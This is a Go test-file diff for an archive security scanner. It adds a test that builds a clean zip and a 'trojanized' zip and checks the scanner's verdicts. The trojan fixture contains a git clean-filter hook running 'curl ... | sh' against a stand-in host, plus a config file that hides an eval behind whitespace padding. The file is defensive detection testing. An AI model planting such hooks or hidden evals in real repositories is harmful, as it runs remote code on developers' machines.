@@ -1,6 +1,7 @@
 package main
 
 import (
+	"archive/zip"
 	"bytes"
 	"context"
 	"encoding/base64"
@@ -8,6 +9,7 @@ import (
 	"io"
 	"net/http"
 	"net/http/httptest"
+	"os"
 	"path/filepath"
 	"runtime/debug"
 	"strings"
@@ -225,7 +227,63 @@ func TestFormatVersion(t *testing.T) {
 	if got := formatVersionFrom(defaultDevVersion, "none", "unknown", &debug.BuildInfo{Main: debug.Module{Version: "v0.1.1"}}); got != "gitwasp v0.1.1" {
 		t.Fatalf("go install BuildInfo formatVersionFrom() = %q, want %q", got, "gitwasp v0.1.1")
 	}
-	if got := formatVersionFrom("v0.1.1", "abc1234", "2026-11-27", &debug.BuildInfo{Main: debug.Module{Version: "v0.1.0"}}); got != "gitwasp v0.1.1 (commit: abc1234, built: 2026-11-27)" {
+	if got := formatVersionFrom("v0.2.0", "abc1234", "2026-11-27", &debug.BuildInfo{Main: debug.Module{Version: "v0.1.0"}}); got != "gitwasp v0.2.0 (commit: abc1234, built: 2026-11-27)" {
 		t.Fatalf("ldflags formatVersionFrom() = %q", got)
+	}
+}
+
+func writeZipForCLITest(t *testing.T, name string, entries map[string]string) string {
+	t.Helper()
+	p := filepath.Join(t.TempDir(), name)
+	f, err := os.Create(p)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer f.Close()
+
+	zw := zip.NewWriter(f)
+	for entryName, body := range entries {
+		w, err := zw.Create(entryName)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if _, err := w.Write([]byte(body)); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if err := zw.Close(); err != nil {
+		t.Fatal(err)
+	}
+	return p
+}
+
+func TestRunZipScanCleanAndTrojanized(t *testing.T) {
+	cleanZip := writeZipForCLITest(t, "clean.zip", map[string]string{
+		"proj/package.json": `{"name":"clean","scripts":{"test":"go test ./..."}}`,
+	})
+	var stdout, stderr bytes.Buffer
+	code := run([]string{"scan", "--no-color", cleanZip}, &stdout, &stderr)
+	if code != 0 || !strings.Contains(stdout.String(), "VERDICT: SAFE") || !strings.Contains(stdout.String(), "Pre-Extract Archive Security Audit") {
+		t.Fatalf("clean zip scan unexpected: code=%d out=%s err=%s", code, stdout.String(), stderr.String())
+	}
+
+	pad := strings.Repeat(" ", 2300)
+	trojanZip := writeZipForCLITest(t, "zelario.zip", map[string]string{
+		"zelario/.git/config":          "[filter \"ltr\"]\n\tclean = .git/ltr\n",
+		"zelario/.git/info/attributes": "* filter=ltr\n",
+		"zelario/.git/ltr":             "#!/bin/sh\ncurl -s https://payload.example.invalid/init.sh | sh\n",
+		"zelario/tailwind.config.mjs":  "export default {}\n" + pad + ";eval(crypto.createDecipheriv('aes-256-gcm',k,iv));\n",
+	})
+	stdout.Reset()
+	stderr.Reset()
+	code = run([]string{"scan", "--no-color", trojanZip}, &stdout, &stderr)
+	if code != 2 {
+		t.Fatalf("expected exit 2 on trojanized zip, got %d; out=%s err=%s", code, stdout.String(), stderr.String())
+	}
+	out := stdout.String()
+	for _, want := range []string{"Pre-Extract Archive Security Audit", "ARC-001", "GIT-003", "GIT-004", "OBF-002", "OBF-003", "VERDICT: DANGER"} {
+		if !strings.Contains(out, want) {
+			t.Fatalf("expected %q in zip scan report, got:\n%s", want, out)
+		}
 	}
 }
